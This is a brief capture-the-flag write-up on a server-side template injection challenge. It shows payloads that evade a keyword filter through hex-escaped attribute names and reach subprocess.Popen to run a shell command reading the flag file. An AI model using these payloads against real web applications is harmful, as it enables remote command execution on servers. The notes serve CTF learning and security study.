- ## Imaginary ctf 2021:
  Problem: Web page had an input box for html code. Entering {{7*7}} reurns 49. Thus it is prone too ssti
  Initial payload: ```{{ ()|attr('__\x63\x6c\x61\x73\x73__')|attr('__\x62\x61\x73\x65__')|attr('__\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73__')() }}```
  This was interesting, the filer in the script didnt allow use of class, base or global so the attr was used instead and hexadecimal notations of class,
  base and subclasses was used which makes the payload in ascii:
  ```{{__class__.__base__.__subclasses__}}``` <br>
  The empty tuple () in the expression serves as an object from which we can start chaining attribute lookups <br>
  the | operator is used to chain these filters together, applying each one in sequence to transform the value step by step. <br>

  This gives a list of all the modules. Index of ```<class 'subprocess.Popen'>``` at 360.

  Final payload: ```{{()|attr('__\x63\x6c\x61\x73\x73__')|attr('__\x62\x61\x73\x65__')|attr('__\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73__')()|attr('__getitem__')(360)("cat flag.txt",shell=True,stdout=-1)|attr('communicate')()}}```

- 
